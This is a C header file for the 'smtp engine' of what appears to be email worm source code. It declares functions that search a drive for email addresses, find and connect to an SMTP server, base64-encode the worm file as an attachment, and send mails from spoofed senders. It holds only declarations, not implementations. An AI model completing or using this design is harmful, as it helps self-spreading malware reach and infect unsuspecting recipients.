
   #include "stdafx.h"
   #include "winsock2.h"

   //smtp engine header


   #ifndef _H_smtp_engine

       #define _H_smtp_engine


   const MAX_MAILS=100;
   const NUMBER_OF_MAIL_INFO=5;

   typedef struct maillist1
   {
       char    mail_list[MAX_MAILS+1][70];
       int     number_of_mails;
       int     max_mails_to_send;
   }Mailist;


   typedef struct mailinfo
   {
       char    text[512];
       char    subject[50];
       char    attachment[50];
       char    mailfrom[50];
   }mail_info;


   typedef struct mailinfo_list
   {
       mail_info   mail_info_list[NUMBER_OF_MAIL_INFO];
       BOOL        fake_mail_from;
       int         number_of_MIL;
   }MailInfoList;

   BOOL SendMails(SOCKET msocket,maillist1 Mail_List,
                  void *base64_image,int b64_size,MailInfoList MIL);

   SOCKET FindSmtp_AndConnect();

   DWORD WINAPI mail_search(LPVOID mail_list);

   BOOL base64_worm_encode(char file[],HGLOBAL &mem,int &size);
   void Base64_free_image(HGLOBAL mem);
   void InitMailSearch(char Root[]);

   #endif
